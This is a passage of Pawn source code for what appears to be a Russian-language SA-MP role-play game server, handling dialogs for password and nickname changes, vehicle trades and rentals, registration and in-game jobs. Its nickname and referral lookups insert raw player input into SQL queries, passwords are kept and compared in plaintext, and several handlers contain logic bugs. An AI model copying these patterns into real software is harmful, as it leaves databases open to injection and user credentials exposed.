				return ShowPlayerDialog(playerid, D_JOB+18, 1, "Смена пароля", "Введите ваш действующий пароль:", "Принять", "Отмена");
			}
			if(IsTextRussian(password))
			{
				SendClientMessage(playerid, COLOR_GREY, "Использовать русские символы запрещено!");
				return ShowPlayerDialog(playerid, D_JOB+18, 1, "Смена пароля", "Введите ваш действующий пароль:", "Принять", "Отмена");
			}
			if(!strcmp(password, PlayerInfo[playerid][pPassword], true)) ShowPlayerDialog(playerid, D_JOB+19, 1, "Смена пароля", "Введите новый пароль:", "Принять", "Отмена");
			else
			{
				SendClientMessage(playerid, COLOR_LIGHTRED, NotTruePassword);
				GKick(playerid);
			}
		}
	case D_JOB+19:
		{
			if(!response) return true;
			new password[32];
			if(sscanf(inputtext, "s[32]",password)) return ShowPlayerDialog(playerid, D_JOB+19, 1, "Смена пароля", "Введите новый пароль:", "Принять", "Отмена");
			if(strlen(password) < 3 || strlen(password) > 16)
			{
				SendClientMessage(playerid, COLOR_GREY, "Кол-во символов от 3 до 16!");
				return ShowPlayerDialog(playerid, D_JOB+19, 1, "Смена пароля", "Введите новый пароль:", "Принять", "Отмена");
			}
			if(IsTextRussian(password))
			{
				SendClientMessage(playerid, COLOR_GREY, "Использовать русские символы запрещено!");
				return ShowPlayerDialog(playerid, D_JOB+19, 1, "Смена пароля", "Введите новый пароль:", "Принять", "Отмена");
			}
			strmid(PlayerInfo[playerid][pPassword], password, 0, strlen(password), 32);
			SendMes(playerid, COLOR_LIGHTRED, "Ваш новый пароль: {ffffff}'%s' (без кавычек)", inputtext);
			SendClientMessage(playerid, COLOR_LIGHTRED, "Рекомендуается сделать скриншот. Клавиша: {ffffff}F8");
			SetPlayerStr(PlayerInfo[playerid][pSendername],"password",PlayerInfo[playerid][pPassword]);
		}
	case D_JOB+20:
		{
			if(!response) return true;
			new name[32];
			if(sscanf(inputtext, "s[32]",name)) return ShowPlayerDialog(playerid, D_JOB+20, 1, "Смена ника", "Введите желаемый ник:", "Принять", "Отмена");
			format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE name = '%s'", name);
			mysql_query(query);
			mysql_store_result();
			if(mysql_fetch_row(query))
			{
				SendClientMessage(playerid, COLOR_GREY, "Игрок с таким именем уже есть на сервере!");
				return ShowPlayerDialog(playerid, D_JOB+20, 1, "Смена ника", "Введите будущий ник\n\nВнимание! Мы меняем только Non-RP ники", "Принять", "Отмена");
			}
			mysql_free_result();
			new full = 0;
			foreach(new i:Player)
			{
				if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
				if(PlayerInfo[i][pAdmin] > 2 && SendAdmin[i]) full++;
			}
			if(full == 0) return SendClientMessage(playerid, COLOR_GREY, "Модераторы игровых логинов сейчас находятся оффлайн!");
			setname = playerid;
			strmid(PlayerName[playerid], name, 0, strlen(name), MAX_PLAYER_NAME);
			SendClientMessage(playerid, COLOR_YELLOW, "Вы успешно отправили заявку на смену игрового логина");
			format(string, 127, "[A] » Игрок %s (ID: %i) просит сменить ник на %s", PlayerInfo[playerid][pSendername], playerid, name);
			SendAdminMessage(COLOR_ORANGE, string);
			foreach(new i:Player)
			{
				if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
				if(PlayerInfo[i][pAdmin] > 5 && SendAdmin[i])
				{
					SendClientMessage(i,COLOR_YELLOW,"Введите /setname, что бы сменить ему ник");
				}
			}
		}
	case D_JOB+22:
		{
			if(!response) return true;
			if(GetPlayerHouse(playerid))
			{
				PlayerInfo[playerid][cVehcoms][0]=0;
				PlayerInfo[playerid][cVehcoms][1]=0;
				PlayerInfo[playerid][cVehcoms][2]=0;
				PlayerInfo[playerid][cVehcoms][3]=0;
				PlayerInfo[playerid][cVehcoms][4]=0;
				PlayerInfo[playerid][cVehcoms][5]=0;
				PlayerInfo[playerid][cVehcoms][6]=0;
				PlayerInfo[playerid][cVehcoms][7]=0;
				PlayerInfo[playerid][cVehcoms][8]=0;
				PlayerInfo[playerid][cVehcoms][9]=0;
				PlayerInfo[playerid][cVehcoms][10]=0;
				PlayerInfo[playerid][cVehcoms][11]=0;
				PlayerInfo[playerid][cVehcoms][12]=0;
				PlayerInfo[playerid][cVehcoms][13]=0;
				PlayerInfo[playerid][cPaintjob]=3;
				format(PlayerInfo[playerid][cVehcom], 64, "%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d",
				PlayerInfo[playerid][cVehcoms][0],PlayerInfo[playerid][cVehcoms][1],PlayerInfo[playerid][cVehcoms][2],
				PlayerInfo[playerid][cVehcoms][3],PlayerInfo[playerid][cVehcoms][4],PlayerInfo[playerid][cVehcoms][5],
				PlayerInfo[playerid][cVehcoms][6],PlayerInfo[playerid][cVehcoms][7],PlayerInfo[playerid][cVehcoms][8],
				PlayerInfo[playerid][cVehcoms][9],PlayerInfo[playerid][cVehcoms][10],PlayerInfo[playerid][cVehcoms][11],
				PlayerInfo[playerid][cVehcoms][12],PlayerInfo[playerid][cVehcoms][13]);
				
				SendMes(playerid, COLOR_LIGHTRED, "Вы продали транспорт, вам заплатили %i$ (половину)", PlayerInfo[playerid][cCost]  / 2);
				PlayerInfo[playerid][pBank] += PlayerInfo[playerid][cCost] / 2;
				if(GetPVarInt(playerid,"PlayerCar") > 0)
				{
					DestroyVehicle(GetPVarInt(playerid,"PlayerCar"));
					DeletePVar(playerid,"PlayerCar");
				}
				Exchequer-=PlayerInfo[playerid][cCost] / 2;
				format(query, 64, "UPDATE "TABLE_MAYOR" SET exchequer = %d", Exchequer);
				PlayerInfo[playerid][cModel]=462;
				PlayerInfo[playerid][cCost]=0;
				PlayerInfo[playerid][cLock]=1;
				PlayerInfo[playerid][cColor][0]=0;
				PlayerInfo[playerid][cColor][1]=0;
				PlayerInfo[playerid][cClass] = 4;
				PlayerInfo[playerid][cFuel] = 200;
				PlayerInfo[playerid][cPaintjob] = 3;
				LoadMyCar(playerid);
			}
		}
	case D_JOB+23:
		{
			if(!response) { RemoveFromVehicle(playerid); return true; }
			if(GetMoney(playerid) < 3000) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!");
			SendClientMessage(playerid, COLOR_BLUE, "Вы арендовали транспорт за 3000 долларов");
			rent_Vehicle[playerid] = GetPlayerVehicleID(playerid);
			GiveMoney(playerid, -3000);
			return true;
		}
	case D_JOB+24:
		{
			new playerd = GetPVarInt(playerid, "CarPlayer"), price = GetPVarInt(playerid, "CarPrice");
			if(response)
			{
				if(GetMoney(playerid) < price)
				{
					SendClientMessage(playerid, COLOR_GREY, YouDoNotHaveEnoughMoney);
					SendMes(playerd, COLOR_LIGHTBLUE, "У %s недостаточно средств", PlayerInfo[playerid][pSendername]);
					DeletePVar(playerid, "CarPrice");
					DeletePVar(playerid, "CarPlayer");
					return true;
				}
				SetPVarInt(playerid,"CModel",PlayerInfo[playerid][cModel]);
				SetPVarInt(playerid,"CClass",PlayerInfo[playerid][cClass]);
				SetPVarInt(playerid,"CFuel",PlayerInfo[playerid][cFuel]);
				SetPVarInt(playerid,"CColor1",PlayerInfo[playerid][cColor][0]);
				SetPVarInt(playerid,"CColor2",PlayerInfo[playerid][cColor][1]);
				SetPVarInt(playerid,"CCost",PlayerInfo[playerid][cCost]);
				SetPVarString(playerid,"CVehcom",PlayerInfo[playerid][cVehcom]);
				SetPVarInt(playerid,"cPaintjob",PlayerInfo[playerid][cPaintjob]);
				////////////////////////////////////////////////////////////////
				PlayerInfo[playerid][cModel]=PlayerInfo[playerd][cModel];
				PlayerInfo[playerid][cClass]=PlayerInfo[playerd][cClass];
				PlayerInfo[playerid][cFuel]=PlayerInfo[playerd][cFuel];
				PlayerInfo[playerid][cColor][0]=PlayerInfo[playerd][cColor][0];
				PlayerInfo[playerid][cColor][1]=PlayerInfo[playerd][cColor][1];
				PlayerInfo[playerid][cCost]=PlayerInfo[playerd][cCost];
				PlayerInfo[playerid][cVehcom]=PlayerInfo[playerd][cVehcom];
				sscanf(PlayerInfo[playerid][cVehcom], "p<,>a<i>[14]",PlayerInfo[playerid][cVehcoms]);
				PlayerInfo[playerid][cPaintjob]=PlayerInfo[playerd][cPaintjob];
				////////////////////////////////////////////////////////////////
				PlayerInfo[playerd][cModel]=GetPVarInt(playerid, "CModel");
				PlayerInfo[playerd][cClass]=GetPVarInt(playerid, "CClass");
				PlayerInfo[playerd][cFuel]=GetPVarInt(playerid, "CFuel");
				PlayerInfo[playerd][cColor][0]=GetPVarInt(playerid, "CColor1");
				PlayerInfo[playerd][cColor][1]=GetPVarInt(playerid, "CColor2");
				PlayerInfo[playerd][cCost]=GetPVarInt(playerid, "CCost");
				PlayerInfo[playerd][cVehcom]=GetPVarInt(playerid, "CVehcom");
				sscanf(PlayerInfo[playerd][cVehcom], "p<,>a<i>[14]",PlayerInfo[playerd][cVehcoms]);
				PlayerInfo[playerd][cPaintjob]=GetPVarInt(playerid, "cPaintjob");
				DestroyVehicle(GetPVarInt(playerid, "PlayerCar"));
				LoadMyCar(playerid);
				DestroyVehicle(GetPVarInt(playerd, "PlayerCar"));
				LoadMyCar(playerd);
				SendMes(playerid, COLOR_LIGHTBLUE, "Вы обменялись транспортами с %s'ом. Доплата: %i долларов", sendername(playerd), price);
				SendMes(playerd, COLOR_LIGHTBLUE, "%s обменялся транспортами с вами. Доплата: %i долларов", sendername(playerid), price);
				SaveAccount(playerid);
				SaveAccount(playerd);
				GiveMoney(playerid, price);
				GiveMoney(playerd, -price);
			}
			else SendMes(playerd, COLOR_LIGHTBLUE, "%s отклонил предложение обменяться транспортом с вами", PlayerInfo[playerid][pSendername]);
			DeletePVar(playerid, "CarPrice");
			DeletePVar(playerid, "CarPlayer");
		}
	case D_JOB+25:
		{
			new playerd = GetPVarInt(playerid, "CarPlayer"), price = GetPVarInt(playerid, "CarPrice");
			if(response)
			{
				if(GetMoney(playerid) < price)
				{
					SendClientMessage(playerid, COLOR_GREY, YouDoNotHaveEnoughMoney);
					SendMes(playerd, COLOR_LIGHTBLUE, "У %s недостаточно средств", PlayerInfo[playerid][pSendername]);
					DeletePVar(playerid, "CarPrice");
					DeletePVar(playerid, "CarPlayer");
					return true;
				}
				PlayerInfo[playerid][cModel]=PlayerInfo[playerd][cModel];
				PlayerInfo[playerid][cClass]=PlayerInfo[playerd][cClass];
				PlayerInfo[playerid][cFuel]=PlayerInfo[playerd][cFuel];
				PlayerInfo[playerid][cColor][0]=PlayerInfo[playerd][cColor][0];
				PlayerInfo[playerid][cColor][1]=PlayerInfo[playerd][cColor][1];
				PlayerInfo[playerid][cCost]=PlayerInfo[playerd][cCost];
				PlayerInfo[playerid][cVehcom]=PlayerInfo[playerd][cVehcom];
				sscanf(PlayerInfo[playerd][cVehcom], "p<,>a<i>[14]",PlayerInfo[playerd][cVehcoms]);
				PlayerInfo[playerid][cPaintjob]=PlayerInfo[playerd][cPaintjob];
				////////////////////////////////////////////////////////////////
				PlayerInfo[playerid][cModel]=0;
				PlayerInfo[playerid][cClass]=0;
				PlayerInfo[playerid][cFuel]=0;
				PlayerInfo[playerid][cColor][0]=0;
				PlayerInfo[playerid][cColor][1]=0;
				PlayerInfo[playerid][cCost]=0;
				format(PlayerInfo[playerid][cVehcom],64,"0,0,0,0,0,0,0,0,0,0,0,0,0,0");
				sscanf(PlayerInfo[playerid][cVehcom], "p<,>a<i>[14]",PlayerInfo[playerid][cVehcoms]);
				PlayerInfo[playerid][cPaintjob]=0;
				DestroyVehicle(GetPVarInt(playerid, "PlayerCar"));
				LoadMyCar(playerid);
				DestroyVehicle(GetPVarInt(playerd, "PlayerCar"));
				LoadMyCar(playerd);
				SendMes(playerd, COLOR_LIGHTBLUE, "Вы продали авто %s за %i долларов", PlayerInfo[playerid][pSendername], price);
				SendMes(playerid, COLOR_LIGHTBLUE, "%s продал вам авто за %i долларов", sendername(playerd), price);
				SaveAccount(playerid);
				SaveAccount(playerd);
				GiveMoney(playerid, price);
				GiveMoney(playerd, -price);
			}
			else SendMes(playerd, COLOR_LIGHTBLUE, "%s отклонил предложение о продаже", PlayerInfo[playerid][pSendername]);
			DeletePVar(playerid, "CarPrice");
			DeletePVar(playerid, "CarPlayer");
		}
	case D_JOB+30:
		{
			if(!response) { SendClientMessage(playerid, COLOR_LIGHTRED, PlayerNeedToLoggedForToPlay); GKick(playerid); }
			if(strlen(inputtext) < 1 || strlen(inputtext) > 36) return ShowPlayerDialog(playerid, D_JOB+30, 1, "{1E90FF}Электронная почта","{ffffff}Уважаемый игрок! Пожалуйста введите свой Email адрес\nЭто поможет вам восстановить доступ к своему аккаунту в случае его утери!\nЕсли вы не хотите указывать свой Email то оставьте поле пустым!", "Далее", "Отмена");
			for(new i = strlen(inputtext); i != 0; --i)
			switch(inputtext[i])
			{
			case 'А'..'Я', 'а'..'я', ' ':
				return KickEx(playerid,243);
			}
			if(strfind(inputtext, "@", true) == -1 || strfind(inputtext, ".", true) == -1)
			{
				SendClientMessage(playerid, COLOR_GREY, "Ошибка при вводе Email, попробуйте еще раз!");
				return ShowPlayerDialog(playerid, D_JOB+30, 1, "{1E90FF}Электронная почта","{ffffff}Уважаемый игрок! Пожалуйста введите свой Email адрес\nЭто поможет вам восстановить доступ к своему аккаунту в случае его утери!\nЕсли вы не хотите указывать свой Email то оставьте поле пустым!", "Далее", "Отмена");
			}
			strmid(PlayerInfo[playerid][pMail], inputtext, 0, strlen(inputtext), 64);
			for(new i = 0; i != 10; ++i) SendClientMessage(playerid, COLOR_ORANGE, " ");
			SendMes(playerid, COLOR_ORANGE, "Ваш электронный адрес: {ffffff}'%s'", PlayerInfo[playerid][pMail]);
			SendClientMessage(playerid, COLOR_ORANGE, "Введите логин игрока, который пригласил вас на сервер");
			SendClientMessage(playerid, COLOR_ORANGE, "Если вы пришли сами, то нажмите 'Пропуск'");
			SetPlayerPos(playerid,109.6245,-1884.7605,59.4377);
			SetPlayerCameraPos(playerid,109.6245,-1884.7605,50.4377);
			SetPlayerCameraLookAt(playerid,141.6159,-1935.7570,45.0666);
			ShowPlayerDialog(playerid, D_JOB+33, 1, "{1E90FF}Кто вас пригласил?", "{ff9900}Введите имя игрока, пригласившего вас на сервер", "Далее", "Пропуск");
		}
	case D_JOB+31:
		{
			if(!response) return true;
			if(PlayerInfo[playerid][pMember] > 0)
			{
				SelectCharID[playerid] = PlayerInfo[playerid][pMember];
				SelectCharPlace[playerid] = 1;
				ClothesRound[playerid] = 2;
			}
			else ClothesRound[playerid] = 3;
			InShopSkin[playerid] = GetPlayerVirtualWorld(playerid);
			SpawnPlayer(playerid);
			
		}
	case D_JOB+33:
		{
			if(!response)
			{
				strmid(PlayerInfo[playerid][pReferal], "None", 0, strlen("None"), MAX_PLAYER_NAME);
				SetPlayerPos(playerid,-1020.5228,1127.1028,65.0580);
				SetPlayerCameraPos(playerid,-1020.5228,1127.1028,59.0580);
				SetPlayerCameraLookAt(playerid,-1157.9843,1063.6970,59.0580);
				ShowPlayerDialog(playerid, D_SEX, 0, "{1E90FF}Кто вы М/Ж?", "{ffffff}Выберите пол вашего персонажа", "Мужской", "Женский");
				for(new i = 0; i != 10; ++i) SendClientMessage(playerid, COLOR_ORANGE, " ");
				SendClientMessage(playerid, COLOR_ORANGE, NeedChooseSex);
				return true;
			}
			if(strlen(inputtext) < 1 || strlen(inputtext) > MAX_PLAYER_NAME) return ShowPlayerDialog(playerid, D_JOB+33, 1, "{1E90FF}Кто вас пригласил?", "{ff9900}Введите имя игрока, пригласившего вас на сервер", "Далее", "Пропуск");
			if(IsTextRussian(inputtext))
			{
				SendClientMessage(playerid, COLOR_GREY, "Использовать русские символы запрещено!");
				return ShowPlayerDialog(playerid, D_JOB+33, 1, "{1E90FF}Кто вас пригласил?", "{ffffff}Введите имя игрока, пригласившего вас на сервер", "Далее", "Пропуск");
			}
			format(query, sizeof(query), "SELECT * FROM accounts WHERE name = '%s'", inputtext);
			mysql_query(query);
			mysql_store_result();
			if(!mysql_fetch_row(query))
			{
				ShowPlayerDialog(playerid, D_JOB+33, 1, "{1E90FF}Кто вас пригласил?", "{ffffff}Введите имя игрока, пригласившего вас на сервер", "Далее", "Пропуск");
				return SendClientMessage(playerid, COLOR_GREY, "Игрок с таким логином не играет на сервере!");
			}
			mysql_free_result();
			SetPlayerPos(playerid,-1020.5228,1127.1028,65.0580);
			SetPlayerCameraPos(playerid,-1020.5228,1127.1028,59.0580);
			SetPlayerCameraLookAt(playerid,-1157.9843,1063.6970,59.0580);
			strmid(PlayerInfo[playerid][pReferal], inputtext, 0, strlen(inputtext), MAX_PLAYER_NAME);
			SendMes(playerid, COLOR_ORANGE, "Ваш реферал: {ffffff}'%s'", inputtext);
			ShowPlayerDialog(playerid, D_SEX, 0, "{1E90FF}Кто вы М/Ж?", "{ffffff}Выберите пол вашего персонажа", "Мужской", "Женский");
			SendClientMessage(playerid, COLOR_ORANGE, NeedChooseSex);
		}
	case D_JOB+34:
		{
			if(!response) return true;
			if(VehInfo[vehinfo_id[listitem]][vStatus] == 1) return SendClientMessage(playerid, COLOR_GREY, "Данный слот пуст!");
			if(listitem < 3 || listitem > 7) return SendClientMessage(playerid, COLOR_GREY, "Данный слот невозможно продать!");
			if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться за рулем транспорта!");
			if(GetPlayerVehicleID(playerid) != VehInfo[vehinfo_id[listitem]][vVehicle]) return SendMes(playerid, COLOR_GREY, "Вы должны находиться в машине %s (Слот №%i)",VehicleNameS[GetVehicleModel(VehInfo[vehinfo_id[listitem]][vVehicle])-400], listitem+1);
			format(string, 127, "{ffffff}Вы действительно хотите продать %s (Слот №%i) ?\n\n{FF6347}Внимание! Вам вернут только половину стоимости транспорта!",VehicleNameS[GetVehicleModel(VehInfo[vehinfo_id[listitem]][vVehicle])-400], listitem+1);
			ShowPlayerDialog(playerid, D_JOB+35, 0, "Транспорт", string, "Да", "Нет");
			SetPVarInt(playerid, "ListitemCar", listitem);
		}
	case D_JOB+38:
		{
			if(!response) return true;
			new Float:x, Float:y, Float:z, Float:fa, shop = GetPVarInt(playerid, "InShop");
			switch(shop)
			{
			case 1: x=549.3206, y=-1289.9803, z=17.2482, fa=0.9819;
			case 2: x=-1656.1429, y=1211.9847, z=7.2500, fa=332.9524;
			}
			DestroyVehicle(veh[playerid]);
			DeletePVar(playerid, "InShop");
			TogglePlayerControllable(playerid,true);
			TextDrawHideForPlayer(playerid,VehNazv[playerid]);
			TextDrawHideForPlayer(playerid,VehCost[playerid]);
			TextDrawHideForPlayer(playerid,PressA);
			TextDrawHideForPlayer(playerid,PressD);
			TextDrawHideForPlayer(playerid,PressH);
			TextDrawHideForPlayer(playerid,PressC);
			TextDrawHideForPlayer(playerid,PressB);
			TextDrawHideForPlayer(playerid,VehBox);
			SetPlayerPos(playerid,x,y,z);
			SetPlayerFacingAngle(playerid,fa);
			SetPlayerInterior(playerid,0);
			SetPlayerVirtualWorld(playerid,0);
			SetCameraBehindPlayer(playerid);
			SendClientMessage(playerid, COLOR_LIGHTRED, "Вы отменили покупку транспорта");
		}
	case D_JOB+41:
		{
			if(!response) return true;
			new full = 0;
			if(listitem < TOTALFRAC)
			{
				for(new i = 1; i <= TOTALVEH; i++)
				{
					if(VehInfo[i][vFr] == listitem+1 && VehInfo[i][vStatus] != 1)
					{
						for(new p; p < MAX_PLAYERS; p++)
						{
							if(!IsPlayerConnected(p) || PlayerLogged[p] == 0) continue;
							if(IsPlayerInVehicle(p, VehInfo[i][vVehicle])) full++;
						}
						if(full == 0) SetVehicleToRespawn(VehInfo[i][vVehicle]);
					}
				}
				SendMes(playerid, COLOR_LIGHTRED, "Вы респавнили транспорт: %s", FracInfo[listitem+1][fName]);
			}
			else if(listitem == TOTALFRAC)
			{
				for(new i = faggio[0]; i <= faggio[1]; i++) SetVehicleToRespawn(i);
				SendClientMessage(playerid, COLOR_LIGHTRED, "Вы респавнили мопеды");
			}
			else if(listitem == TOTALFRAC+1)
			{
				for(new i = farm1car[0]; i <= farm1car[1]; i++) SetVehicleToRespawn(i);
				SendClientMessage(playerid, COLOR_LIGHTRED, "Вы респавнили авто фермы");
			}
			else if(listitem == TOTALFRAC+2)
			{
				for(new i = 1; i < lastveh; i++) SetVehicleToRespawn(i);
				SendClientMessage(playerid, COLOR_LIGHTRED, "Вы респавнили все авто!");
			}
			return true;
		}
	case D_JOB+42:
		{
			if(!response) return true;
			if(GetMoney(playerid) < 500) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!");
			SendClientMessage(playerid, COLOR_BLUE, "Выходите во двор и садитесь в свободный транспорт");
			ShowPlayerDialog(playerid, D_NULL, 0, "{33AAFF}Права", "{ffffff}Вы начали экзамен по вождению\n\nВыходите на стоянку и садитесь в транспорт", "Закрыть", "");
			SetPVarInt(playerid, "LicTest", 1);
			if(PlayerInfo[playerid][pLevel] == 1) GiveMoney(playerid, -300);
			else GiveMoney(playerid, -1000);
			pPressed[playerid] = 0;
			SetPlayerRaceCheckpoint(playerid, 1,-2076.5803,-94.2128,34.907,-2076.5803,-94.2128,34.907, 7.0);
			return true;
		}
	case D_JOB+54:
		{
			if(!response) return true;
			new color[2];
			if(sscanf(inputtext, "p<,>ii",color[0], color[1])) return ShowPlayerDialog(playerid, D_JOB+54, 1, "Цвета", "Введите цвет1 и цвет2 транспорта через запятую:", "Принять", "Отмена");
			if(color[0] < 0 || color[0] > 252)
			{
				ShowPlayerDialog(playerid, D_JOB+54, 1, "Цвета", "Введите цвет1 и цвет2 транспорта через запятую:", "Принять", "Отмена");
				return SendClientMessage(playerid, COLOR_GREY, "ID цвета от 0 до 252!");
			}
			if(color[1] < 0 || color[1] > 252)
			{
				ShowPlayerDialog(playerid, D_JOB+54, 1, "Цвета", "Введите цвет1 и цвет2 транспорта через запятую:", "Принять", "Отмена");
				return SendClientMessage(playerid, COLOR_GREY, "ID цвета от 0 до 252!");
			}
			ChangeVehicleColor(GetPlayerVehicleID(playerid), color[0], color[1]);
			for(new i = 0; i < 2; i++) colors[playerid][i] = color[i];
			return true;
		}
	case D_JOB+55:
		{
			if(!response) return true;
			new price;
			if(sscanf(inputtext, "i",price)) return ShowPlayerDialog(playerid, D_JOB+55, 1, "Проезд", "Введите стоимость проезда:", "Принять", "Отмена");
			if(price < 1 || price > 1000)
			{
				SendClientMessage(playerid, COLOR_GREY, "Цена проезда от 1 до 1000!");
				return ShowPlayerDialog(playerid, D_JOB+55, 1, "Проезд", "Введите стоимость проезда:", "Принять", "Отмена");
			}
			SetPVarInt(playerid, "PriceBus", price);
			ShowPlayerDialog(playerid, D_JOB+56, 2, "Маршрут", "Внутри-городской ЛС\nВнутри-городской СФ\nВнутри-городской ЛВ\nЖД Вокзал - Автошкола\nЖД Вокзал - Карьер", "Принять", "Отмена");
		}
	case D_JOB+56:
		{
			if(!response) return true;
			new name[32];
			switch(listitem)
			{
			case 0:
				{
					if(!IsPlayerInRangeOfPoint(playerid, 30.0,1790.5295,-1910.3073,13.3970))
					{
						DeletePVar(playerid, "PriceBus");
						return SendClientMessage(playerid, COLOR_GREY, "Вы слишком далеко от ЖД вокзала ЛС!");
					}
					name = "Внутри-городской ЛС";
				}
			case 1:
				{
					if(!IsPlayerInRangeOfPoint(playerid, 40.0,-1990.5427,146.0030,27.6725))
					{
						DeletePVar(playerid, "PriceBus");
						return SendClientMessage(playerid, COLOR_GREY, "Вы слишком далеко от ЖД вокзала СФ!");
					}
					name = "Внутри-городской СФ";
				}
			case 2:
				{
					if(!IsPlayerInRangeOfPoint(playerid, 30.0,2810.8474,1289.6901,10.88720))
					{
						DeletePVar(playerid, "PriceBus");
						return SendClientMessage(playerid, COLOR_GREY, "Вы слишком далеко от ЖД вокзала ЛВ!");
					}
					name = "Внутри-городской ЛВ";
				}
			case 3:
				{
					if(!IsPlayerInRangeOfPoint(playerid, 30.0,1790.5295,-1910.3073,13.3970))
					{
						DeletePVar(playerid, "PriceBus");
						return SendClientMessage(playerid, COLOR_GREY, "Вы слишком далеко от ЖД вокзала ЛС!");
					}
					name = "ЖД вокзал - Автошкола";
				}
			case 4:
				{
					if(!IsPlayerInRangeOfPoint(playerid, 30.0,1790.5295,-1910.3073,13.3970))
					{
						DeletePVar(playerid, "PriceBus");
						return SendClientMessage(playerid, COLOR_GREY, "Вы слишком далеко от ЖД вокзала ЛС!");
					}
					name = "ЖД вокзал - Карьер";
				}
			}
			SetPVarInt(playerid, "TypeBus", listitem+1);
			SendClientMessage(playerid, COLOR_BLUE, "Вы начали работу водителя автобуса");
			format(string, 128, "Автобус отъезжает через несколько секунд (%s)",name);
			ProxDetectorNew(playerid, 30.0, COLOR_FADE5, string);
			format(string, 90, "%s\n{ffffff}Стоимость проезда: {33AAFF}%i {ffffff}долларов", name, GetPVarInt(playerid, "PriceBus"));
			BusText3D[playerid] = Create3DTextLabel( string, 0x33AAFFFF, 0.0, 0.0, 0.0, 50.0, 0, 1);
			Attach3DTextLabelToVehicle(BusText3D[playerid], GetPlayerVehicleID(playerid), 0.0, 0.0, 2.25);
			pPressed[playerid] = 0;
			new i = pPressed[playerid], type = GetPVarInt(playerid, "TypeBus");
			if(type == 1) SetPlayerRaceCheckpoint(playerid,0,BusCityLS[i][0],BusCityLS[i][1],BusCityLS[i][2],BusCityLS[i][3],BusCityLS[i][4],BusCityLS[i][5],5.0);
			if(type == 2) SetPlayerRaceCheckpoint(playerid,0,BusCitySF[i][0],BusCitySF[i][1],BusCitySF[i][2],BusCitySF[i][3],BusCitySF[i][4],BusCitySF[i][5],5.0);
			if(type == 3) SetPlayerRaceCheckpoint(playerid,0,BusCityLV[i][0],BusCityLV[i][1],BusCityLV[i][2],BusCityLV[i][3],BusCityLV[i][4],BusCityLV[i][5],5.0);
			if(type == 4) SetPlayerRaceCheckpoint(playerid,0,BusSchool[i][0],BusSchool[i][1],BusSchool[i][2],BusSchool[i][3],BusSchool[i][4],BusSchool[i][5],5.0);
			if(type == 5) SetPlayerRaceCheckpoint(playerid,0,BusLS[i][0],BusLS[i][1],BusLS[i][2],BusLS[i][3],BusLS[i][4],BusLS[i][5],5.0);
			return true;
		}
	case D_JOB+57:
		{
			if(!response) return true;
			new price;
			if(sscanf(inputtext, "i",price)) return ShowPlayerDialog(playerid, D_JOB+57, 1, "Тариф", "Введите стоимость проезда:", "Принять", "Отмена");
			if(price < 1 || price > 100)
			{
				SendClientMessage(playerid, COLOR_GREY, "Цена проезда от 1 до 100!");
				return ShowPlayerDialog(playerid, D_JOB+57, 1, "Тариф", "Введите стоимость проезда:", "Принять", "Отмена");
			}
			SendClientMessage(playerid, COLOR_BLUE, "Вы начали работу таксиста");
			SetPVarInt(playerid, "PriceTaxi", price);
			format(string, 90, "{fffffF}Тариф: {33AAFF}%i {ffffff}долларов", price);
			TaxiText3D[playerid] = Create3DTextLabel(string, 0x33AAFFFF, 0.0, 0.0, 0.0, 50.0, 0, 1);
			Attach3DTextLabelToVehicle(TaxiText3D[playerid], GetPlayerVehicleID(playerid), 0.0, 0.0, 1.24);
			return true;
		}
	case D_JOB+58:
		{
			if(!response) { RemoveFromVehicle(playerid); return true; }
			if(GetMoney(playerid) < 500) { RemoveFromVehicle(playerid); return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!"); }
			SendClientMessage(playerid, COLOR_BLUE, "Вы арендовали автобус за 500 долларов");
			SetPVarInt(playerid, "RentBus", GetPlayerVehicleID(playerid));
			GiveMoney(playerid, -500);
			return true;
		}
	case D_JOB+59:
		{
			if(!response) { RemoveFromVehicle(playerid); return true; }
			if(GetMoney(playerid) < 500) { RemoveFromVehicle(playerid); return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!"); }
			SendClientMessage(playerid, COLOR_BLUE, "Вы арендовали транспорт за 500 долларов");
			SetPVarInt(playerid, "RentTaxi", GetPlayerVehicleID(playerid));
			GiveMoney(playerid, -500);
			return true;
		}
	case D_JOB+60:
		{
			if(!response) return true;
			new price;
			if(sscanf(inputtext, "i",price))
			{
				format(string, 256, "{ffffff}Введите кол-во кг рыбы:\n\nВы имеете {8d8dff}%i{ffffff} кг рыбы\nНа {8D8DFF}1{ffffff} единицу кг рыбы приходиться {8D8DFF}8 {ffffff}долларов", PlayerInfo[playerid][pFish]);
				return ShowPlayerDialog(playerid, D_JOB+60, 1, "Рыба", string, "Принять", "Отмена");
			}
			if(price < 1 || price > PlayerInfo[playerid][pFish])
			{
				SendClientMessage(playerid, COLOR_GREY, "У вас нет столько кг рыбы!");
				format(string, 256, "{ffffff}Введите кол-во кг рыбы:\n\nВы имеете {8d8dff}%i{ffffff} кг рыбы\nНа {8D8DFF}1{ffffff} единицу кг рыбы приходиться {8D8DFF}8 {ffffff}долларов", PlayerInfo[playerid][pFish]);
				return ShowPlayerDialog(playerid, D_JOB+60, 1, "Рыба", string, "Принять", "Отмена");
			}
			SendMes(playerid, COLOR_BLUE, "Вы продали %i кг рыбы. Вам выдано: %i долларов", price, price*5);
			GiveMoney(playerid, price*5);
			PlayerInfo[playerid][pFish] -= price;
			return true;
		}
	case D_JOB+63:
		{
			if(!response) return true;
			SetPVarInt(playerid, "OldMinerSkin",GetPlayerSkin(playerid));
			SetPlayerSkin(playerid, 16);
			SetPVarInt(playerid, "Noun", 1);
			SendClientMessage(playerid, COLOR_GREEN, "Вы начали работу на бульдозере. Садитесь в свободный бульдозер");
			return true;
		}
	case D_JOB+64:
		{
			if(!response) return true;
			DeletePVar(playerid, "Noun");
			SetPlayerSkin(playerid, GetPVarInt(playerid, "OldMinerSkin"));
			SendMes(playerid, COLOR_WHITE, "Вы закончили работу. Ваш заработок: {33aa33}%i{ffffff} долларов",GetPVarInt(playerid, "MinerKG")*2);
			GiveMoney(playerid,GetPVarInt(playerid, "MinerKG")*2);
